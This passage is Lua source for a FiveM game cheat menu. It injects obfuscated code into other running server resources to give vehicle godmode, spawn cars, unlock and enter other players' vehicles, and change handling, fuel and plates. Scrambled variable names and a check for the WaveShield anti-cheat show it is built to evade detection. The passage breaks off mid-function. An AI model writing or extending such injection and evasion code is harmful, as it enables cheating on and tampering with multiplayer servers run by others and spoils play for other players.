MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Godmode", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
        zXcVbNmQwErTyUi = true

        local function LWyZoXRbqK()
            local LkJhGfDsAzXcVb = CreateThread
            LkJhGfDsAzXcVb(function()
                while zXcVbNmQwErTyUi and not Unloaded do
                    local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                    local TyUiOpAsDfGhJkL = PlayerPedId
                    local AsDfGhJkLzXcVbN = SetEntityInvincible

                    local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                    if vehicle and vehicle ~= 0 then
                        AsDfGhJkLzXcVbN(vehicle, true)
                    end
                    Wait(0)
                end
            end)
        end

        LWyZoXRbqK()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        zXcVbNmQwErTyUi = false
        local QwErTyUiOpAsDfG = GetVehiclePedIsIn
        local TyUiOpAsDfGhJkL = PlayerPedId
        local AsDfGhJkLzXcVbN = SetEntityInvincible

        local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
        if vehicle and vehicle ~= 0 then
            AsDfGhJkLzXcVbN(vehicle, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Force Vehicle Engine", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
        GhYtReFdCxWaQzLp = true

        local function OpAsDfGhJkLzXcVb()
            local lMnbVcXzZaSdFg = CreateThread
            lMnbVcXzZaSdFg(function()
                local QwErTyUiOp         = _G.PlayerPedId
                local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                local En_g_Health_Get    = _G.GetVehicleEngineHealth
                local En_g_Health_Set    = _G.SetVehicleEngineHealth
                local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                local function _tick(vh)
                    if vh and vh ~= 0 then
                        No_Hotwire_Set(vh, false)
                        En_g_Degrade_Set(vh, false)
                        ErTyUiOpAsDfGh(vh, false)
                        KeEpOnAb(vh, true)

                        local eh = En_g_Health_Get(vh)
                        if (not eh) or eh < 300.0 then
                            En_g_Health_Set(vh, 900.0)
                        end

                        ZxCvBnMqWeRtYu(vh, true, true, true)
                    end
                end

                while GhYtReFdCxWaQzLp and not Unloaded do
                    local p  = QwErTyUiOp()

                    _tick(AsDfGhJkLz(p, false))
                    _tick(TyUiOpAsDfGh(p))
                    _tick(AsDfGhJkLz(p, true))

                    Wait(0)
                end
            end)
        end

        OpAsDfGhJkLzXcVb()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        GhYtReFdCxWaQzLp = false
        local v = GetVehiclePedIsIn(PlayerPedId(), false)
        if v and v ~= 0 then
            SetVehicleKeepEngineOnWhenAbandoned(v, false)
            SetVehicleEngineCanDegrade(v, true)
            SetVehicleUndriveable(v, false)
        end
    ]])
end)


MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Auto Repair", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
        PlAsQwErTyUiOp = true

        local function uPkqLXTm98()
            local QwErTyUiOpAsDf = CreateThread
            QwErTyUiOpAsDf(function()
                while PlAsQwErTyUiOp and not Unloaded do
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local LzXcVbNmQwErTy = GetVehiclePedIsIn
                    local VbNmLkJhGfDsAz = SetVehicleFixed
                    local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                    local ped = AsDfGhJkLzXcVb()
                    local vehicle = LzXcVbNmQwErTy(ped, false)
                    if vehicle and vehicle ~= 0 then
                        VbNmLkJhGfDsAz(vehicle)
                        MnBvCxZaSdFgHj(vehicle, 0.0)
                    end

                    Wait(0)
                end
            end)
        end

        uPkqLXTm98()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        PlAsQwErTyUiOp = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Freeze Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
        LzKxWcVbNmQwErTy = true

        local function WkQ79ZyLpT()
            local tYhGtFrDeSwQaZx = CreateThread
            local xCvBnMqWeRtYuIo = PlayerPedId
            local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
            local gKdNqLpYxMiV = FreezeEntityPosition
            local jBtWxFhPoZuR = Wait

            tYhGtFrDeSwQaZx(function()
                while LzKxWcVbNmQwErTy and not Unloaded do
                    local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                    local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                    if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                        gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                    end
                    jBtWxFhPoZuR(0)
                end
            end)
        end

        WkQ79ZyLpT()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        LzKxWcVbNmQwErTy = false

        local function i7qWlBXtPo()
            local yUiOpAsDfGhJkLz = PlayerPedId
            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
            local FdSaPlMnBvCxZlK = FreezeEntityPosition

            local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
            local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
            if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
            end
        end

        i7qWlBXtPo()
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Hop", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
        NuRqVxEyKiOlZm = true

        local function qPTnXLZKyb()
            local ZlXoKmVcJdBeTr = CreateThread
            ZlXoKmVcJdBeTr(function()
                while NuRqVxEyKiOlZm and not Unloaded do
                    local GvHnMzLoPqAxEs = PlayerPedId
                    local DwZaQsXcErDfGt = GetVehiclePedIsIn
                    local BtNhUrLsEkJmWq = IsDisabledControlPressed
                    local PlZoXvNyMcKwQi = ApplyForceToEntity

                    local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                    local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                    if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                        PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                    end

                    Wait(0)
                end
            end)
        end

        qPTnXLZKyb()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        NuRqVxEyKiOlZm = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Rainbow Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
        GxRpVuNzYiTq = true

        local function jqX7TvYzWq()
            local WvBnMpLsQzTx = GetGameTimer
            local VcZoPwLsEkRn = math.floor
            local DfHkLtQwAzCx = math.sin
            local PlJoQwErTgYs = CreateThread
            local MzLxVoKsUyNz = GetVehiclePedIsIn
            local EyUiNkOpLtRg = PlayerPedId
            local KxFwEmTrZpYq = DoesEntityExist
            local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
            local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

            local yGfTzLkRn = 1.0

            local function HrCvWbXuNz(freq)
                local color = {}
                local t = WvBnMpLsQzTx() / 1000
                color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                return color
            end

            PlJoQwErTgYs(function()
                while GxRpVuNzYiTq and not Unloaded do
                    local ped = EyUiNkOpLtRg()
                    local veh = MzLxVoKsUyNz(ped, false)
                    if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                        local rgb = HrCvWbXuNz(yGfTzLkRn)
                        UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                        BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                    end
                    Wait(0)
                end
            end)
        end

        jqX7TvYzWq()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        GxRpVuNzYiTq = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Drift Mode (Hold Shift)", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
        MqTwErYuIoLp = true

        local function PlRtXqJm92()
            local XtFgDsQwAzLp = CreateThread
            local UiOpAsDfGhKl = PlayerPedId
            local JkHgFdSaPlMn = GetVehiclePedIsIn
            local WqErTyUiOpAs = IsControlPressed
            local AsZxCvBnMaSd = DoesEntityExist
            local KdJfGvBhNtMq = SetVehicleReduceGrip

            XtFgDsQwAzLp(function()
                while MqTwErYuIoLp and not Unloaded do
                    Wait(0)
                    local ped = UiOpAsDfGhKl()
                    local veh = JkHgFdSaPlMn(ped, false)
                    if veh ~= 0 and AsZxCvBnMaSd(veh) then
                        if WqErTyUiOpAs(0, 21) then
                            KdJfGvBhNtMq(veh, true)
                        else
                            KdJfGvBhNtMq(veh, false)
                        end
                    end
                end
            end)
        end

        PlRtXqJm92()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        MqTwErYuIoLp = false
        local ZtQwErTyUiOp = PlayerPedId
        local DfGhJkLzXcVb = GetVehiclePedIsIn
        local VbNmAsDfGhJk = DoesEntityExist
        local NlJkHgFdSaPl = SetVehicleReduceGrip

        local ped = ZtQwErTyUiOp()
        local veh = DfGhJkLzXcVb(ped, false)
        if veh ~= 0 and VbNmAsDfGhJk(veh) then
            NlJkHgFdSaPl(veh, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Easy Handling", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
        NvGhJkLpOiUy = true

        local function KbZwVoYtLx()
            local BtGhYtUlOpLk = CreateThread
            local WeRtYuIoPlMn = PlayerPedId
            local TyUiOpAsDfGh = GetVehiclePedIsIn
            local UyTrBnMvCxZl = SetVehicleGravityAmount
            local PlMnBvCxZaSd = SetVehicleStrong

            BtGhYtUlOpLk(function()
                while NvGhJkLpOiUy and not Unloaded do
                    local ped = WeRtYuIoPlMn()
                    local veh = TyUiOpAsDfGh(ped, false)
                    if veh and veh ~= 0 then
                        UyTrBnMvCxZl(veh, 73.0)
                        PlMnBvCxZaSd(veh, true)
                    end
                    Wait(0)
                end

                local ped = WeRtYuIoPlMn()
                local veh = TyUiOpAsDfGh(ped, false)
                if veh and veh ~= 0 then
                    UyTrBnMvCxZl(veh, 9.8)
                    PlMnBvCxZaSd(veh, false)
                end
            end)
        end

        KbZwVoYtLx()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        NvGhJkLpOiUy = false
        local UyTrBnMvCxZl = SetVehicleGravityAmount
        local PlMnBvCxZaSd = SetVehicleStrong
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            UyTrBnMvCxZl(veh, 9.8)
            PlMnBvCxZaSd(veh, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Shift Boost", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
        QwErTyUiOpSh = true

        local function ZxCvBnMmLl()
            local aAaBbCcDdEe = CreateThread
            local fFfGgGgHhIi = Wait
            local jJkKlLmMnNo = PlayerPedId
            local pPqQrRsStTu = IsPedInAnyVehicle
            local vVwWxXyYzZa = GetVehiclePedIsIn
            local bBcCdDeEfFg = IsDisabledControlJustPressed
            local sSeEtTvVbBn = SetVehicleForwardSpeed

            aAaBbCcDdEe(function()
                while QwErTyUiOpSh and not Unloaded do
                    local _ped = jJkKlLmMnNo()
                    if pPqQrRsStTu(_ped, false) then
                        local _veh = vVwWxXyYzZa(_ped, false)
                        if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                            sSeEtTvVbBn(_veh, 150.0)
                        end
                    end
                    fFfGgGgHhIi(0)
                end
            end)
        end

        ZxCvBnMmLl()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        QwErTyUiOpSh = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Instant Breaks", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
        VkLpOiUyTrEq = true

        local function YgT7FrqXcN()
            local ZxSeRtYhUiOp = CreateThread
            local LkJhGfDsAzXv = PlayerPedId
            local PoLkJhBgVfCd = GetVehiclePedIsIn
            local ErTyUiOpAsDf = IsDisabledControlPressed
            local GtHyJuKoLpMi = IsPedInAnyVehicle
            local VbNmQwErTyUi = SetVehicleForwardSpeed

            ZxSeRtYhUiOp(function()
                while VkLpOiUyTrEq and not Unloaded do
                    local ped = LkJhGfDsAzXv()
                    local veh = PoLkJhBgVfCd(ped, false)
                    if veh and veh ~= 0 then
                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                            VbNmQwErTyUi(veh, 0.0)
                        end
                    end
                    Wait(0)
                end
            end)
        end

        YgT7FrqXcN()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        VkLpOiUyTrEq = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Unlimited Fuel", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
        BlNkJmLzXcVb = true

        local function LqWyXpR3tV()
            local TmPlKoMiJnBg = CreateThread
            local ZxCvBnMaSdFg = PlayerPedId
            local YhUjIkOlPlMn = IsPedInAnyVehicle
            local VcXzQwErTyUi = GetVehiclePedIsIn
            local KpLoMkNjBhGt = DoesEntityExist
            local JkLzXcVbNmAs = SetVehicleFuelLevel

            TmPlKoMiJnBg(function()
                while BlNkJmLzXcVb and not Unloaded do
                    local ped = ZxCvBnMaSdFg()
                    if YhUjIkOlPlMn(ped, false) then
                        local veh = VcXzQwErTyUi(ped, false)
                        if KpLoMkNjBhGt(veh) then
                            JkLzXcVbNmAs(veh, 100.0)
                        end
                    end
                    Wait(100)
                end
            end)
        end

        LqWyXpR3tV()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        BlNkJmLzXcVb = false
    ]])
end)

local LicensePlateHandle = MachoMenuInputbox(VehicleTabSections[2], "License Plate:", "...")
MachoMenuButton(VehicleTabSections[2], "Set License Plate", function()
    local LicensePlate = MachoMenuGetInputbox(LicensePlateHandle)

    if type(LicensePlate) == "string" and LicensePlate ~= "" then
        local injectedCode = string.format([[
            local function xKqLZVwPt9()
                local XcVbNmAsDfGhJkL = PlayerPedId
                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                local pEd = XcVbNmAsDfGhJkL()
                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                if vEh and vEh ~= 0 then
                    PoIuYtReWqAzXsDc(vEh, "%s")
                end

            end

            xKqLZVwPt9()
        ]], LicensePlate)

        MachoInjectResource(CheckResource("monitor") and "monitor" or "any", injectedCode)
    end
end)

local VehicleSpawnerBox = MachoMenuInputbox(VehicleTabSections[2], "Vehicle Model:", "...")
MachoMenuButton(VehicleTabSections[2], "Spawn Car", function()
    local VehicleModel = MachoMenuGetInputbox(VehicleSpawnerBox)

    local waveShieldRunning = GetResourceState("WaveShield") == "started"
    local lbPhoneRunning = GetResourceState("lb-phone") == "started"

    local injectedCode

    if not waveShieldRunning and lbPhoneRunning then
        injectedCode = ([[ 
            if type(CreateFrameworkVehicle) == "function" then
                local model = "%s"
                local hash = GetHashKey(model)
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then
                    local coords = GetEntityCoords(ped)
                    if coords then
                        local vehicleData = {
                            vehicle = json.encode({ model = model })
                        }
                        CreateFrameworkVehicle(vehicleData, coords)
                    end
                end
            end
        ]]):format(VehicleModel)

        MachoInjectResource("lb-phone", injectedCode)

    else
        injectedCode = ([[ 
            local function XzRtVbNmQwEr()
                local tYaPlXcUvBn = PlayerPedId
                local iKoMzNbHgTr = GetEntityCoords
                local wErTyUiOpAs = GetEntityHeading
                local hGtRfEdCvBg = RequestModel
                local bNjMkLoIpUh = HasModelLoaded
                local pLkJhGfDsAq = Wait
                local sXcVbNmZlQw = GetVehiclePedIsIn
                local yUiOpAsDfGh = DeleteVehicle
                local aSxDcFgHvBn = _G.CreateVehicle
                local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                local zMxNaLoKvRe = SetEntityAsMissionEntity
                local mVbGtRfEdCv = SetVehicleOutOfControl
                local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                local vBtNrEuPwOa = SetNetworkIdCanMigrate
                local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                local bPeDrTfGyHu = tYaPlXcUvBn()
                local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                local nMiLoPzXwEq = "%s"

                hGtRfEdCvBg(nMiLoPzXwEq)
                while not bNjMkLoIpUh(nMiLoPzXwEq) do
                    pLkJhGfDsAq(100)
                end

                local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                    yUiOpAsDfGh(fVbGtFrEdSw)
                end

                local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                eDsFgHjKlQw(xFrEdCvBgTn, false)
                lAzSdXfCvBg(sMnLoKiJpUb, true)
                nMqWlAzXcVb(xFrEdCvBgTn, false)
                vBtNrEuPwOa(sMnLoKiJpUb, true)
                gHrTyUjLoPk(nMiLoPzXwEq)

                kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
            end

            XzRtVbNmQwEr()
        ]]):format(VehicleModel)

        MachoInjectResource(CheckResource("monitor") and "monitor" or "any", injectedCode)
    end
end)

MachoMenuButton(VehicleTabSections[3], "Repair Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function FgN7LqxZyP()
            local aBcD = PlayerPedId
            local eFgH = GetVehiclePedIsIn
            local iJkL = SetVehicleFixed
            local mNoP = SetVehicleDeformationFixed

            local p = aBcD()
            local v = eFgH(p, false)
            if v and v ~= 0 then
                iJkL(v)
                mNoP(v)
            end
        end

        FgN7LqxZyP()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Flip Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function vXmYLT9pq2()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = GetEntityHeading
            local d = SetEntityRotation

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                d(veh, 0.0, 0.0, c(veh))
            end
        end

        vXmYLT9pq2()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Clean Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qPwRYKz7mL()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = SetVehicleDirtLevel

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                c(veh, 0.0)
            end
        end

        qPwRYKz7mL()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Delete Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function LXpTqWvR80()
            local aQw = PlayerPedId
            local bEr = GetVehiclePedIsIn
            local cTy = DoesEntityExist
            local dUi = NetworkHasControlOfEntity
            local eOp = SetEntityAsMissionEntity
            local fAs = DeleteEntity
            local gDf = DeleteVehicle
            local hJk = SetVehicleHasBeenOwnedByPlayer

            local ped = aQw()
            local veh = bEr(ped, false)

            if veh and veh ~= 0 and cTy(veh) then
                hJk(veh, true)
                eOp(veh, true, true)

                if dUi(veh) then
                    fAs(veh)
                    gDf(veh)
                end
            end

        end

        LXpTqWvR80()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Toggle Vehicle Engine", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function NKzqVoXYLm()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = GetIsVehicleEngineRunning
            local d = SetVehicleEngineOn

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                if c(veh) then
                    d(veh, false, true, true)
                else
                    d(veh, true, true, false)
                end
            end
        end

        NKzqVoXYLm()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Max Vehicle Upgrades", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function XzPmLqRnWyBtVkGhQe()
            local FnUhIpOyLkTrEzSd = PlayerPedId
            local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
            local RfDsHuNjMaLpOyBt = SetVehicleModKit
            local AqWsEdRzXcVtBnMa = SetVehicleWheelType
            local TyUiOpAsDfGhJkLz = GetNumVehicleMods
            local QwErTyUiOpAsDfGh = SetVehicleMod
            local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
            local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
            local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
            local UjMiKoLpNwAzSdFg = SetVehicleExtra
            local RvTgYhNuMjIkLoPb = DoesExtraExist

            local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
            local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
            if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

            RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
            AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

            for XyZoPqRtWnEsDfGh = 0, 16 do
                local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                end
            end

            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

            local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
            if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
            end

            for QeTrBnMkOjHuYgFv = 17, 22 do
                ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
            end

            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

            for TpYuIoPlMnBvCxZq = 1, 12 do
                if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                    UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                end
            end

            MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
            LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
        end

        XzPmLqRnWyBtVkGhQe()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Teleport into Closest Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function uPKcoBaEHmnK()
            local ziCFzHyzxaLX = SetPedIntoVehicle
            local YPPvDlOGBghA = GetClosestVehicle

            local Coords = GetEntityCoords(PlayerPedId())
            local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

            if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                else
                    ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                end
            end
        end

        uPKcoBaEHmnK()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Unlock Closest Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function TpLMqKtXwZ()
            local AsoYuTrBnMvCxZaQw = PlayerPedId
            local GhrTnLpKjUyVbMnZx = GetEntityCoords
            local UyeWsDcXzQvBnMaLp = GetClosestVehicle
            local ZmkLpQwErTyUiOpAs = DoesEntityExist
            local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
            local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
            local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
            local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
            local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

            local ped = AsoYuTrBnMvCxZaQw()
            local coords = GhrTnLpKjUyVbMnZx(ped)
            local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

            if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                VczNmLoJhBgVfCdEx(veh, true, true)
                RtYuIoPlMnBvCxZaSd(veh, true)
                EqWoXyBkVsNzQuH(veh, 1)
                YxZwQvTrBnMaSdFgHj(veh, false)
            end

        end

        TpLMqKtXwZ()
    ]])
end)

MachoMenuButton(VehicleTabSections[3], "Lock Closest Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function tRYpZvKLxQ()
            local WqEoXyBkVsNzQuH = PlayerPedId
            local LoKjBtWxFhPoZuR = GetEntityCoords
            local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
            local TyUiOpAsDfGhJkLzXc = DoesEntityExist
            local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
            local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
            local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
            local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
            local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

            local ped = WqEoXyBkVsNzQuH()
            local coords = LoKjBtWxFhPoZuR(ped)
            local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

